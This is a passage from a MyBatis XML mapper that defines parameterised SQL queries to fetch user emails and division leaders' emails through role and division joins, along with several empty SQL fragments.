				AND a.status = #{status}
			</if>
		</where>
	</select>
	
	<sql id="getColumn">
		
	</sql>

	<sql id="getFrom">
		
	</sql>

	<sql id="getWhere">
		
	</sql>

	<sql id="selectColumn">
		
	</sql>

	<sql id="selectFrom">
		
	</sql>

	<sql id="selectWhere">
		
	</sql>

	<sql id="countFrom">
		
	</sql>

	<sql id="searchFrom">
		
	</sql>

	<sql id="countWhere">
		
	</sql>

	<sql id="searchWhere">
		
	</sql>

	<sql id="updateColumn">
		
	</sql>

	<sql id="updateWhere">
		id = #{id}
	</sql>
	
	<select id="getForEmail" parameterType="java.lang.Object" resultMap="user">
		SELECT email FROM user
		<where>
			<if test="id != null">
				AND id = #{id}
			</if>
		</where>
	</select>
	<select id="selectForLeaderEmail" parameterType="java.lang.Object" resultMap="user">
		SELECT email
			FROM
			(
				SELECT u.displayName, u.userId, ud.divisionId 
				FROM `user` u
				INNER JOIN userDivision ud ON u.id = ud.userId
				WHERE u.id = #{userId}
				AND ud.mainIndex = 1
			) AS temp1
			INNER JOIN
			(
				SELECT us.loginName, us.email, ro.name, usd.divisionId 
				FROM `user` us
				INNER JOIN userRole ur ON us.id = ur.userId
				INNER JOIN 
				(
					SELECT * FROM role r
			 		<if test="rolesManagerIds != null">
					WHERE r.id in
					<foreach collection="rolesManagerIds" item="rolesManagerId" open="(" separator="," close=")">
						#{rolesManagerId}
					</foreach>
				</if>
				) AS ro ON ro.id = ur.roleId
			
				INNER JOIN userDivision usd ON us.id = usd.userId
			) AS temp2
			ON temp1.divisionId = temp2.divisionId
	</select>		
</mapper>
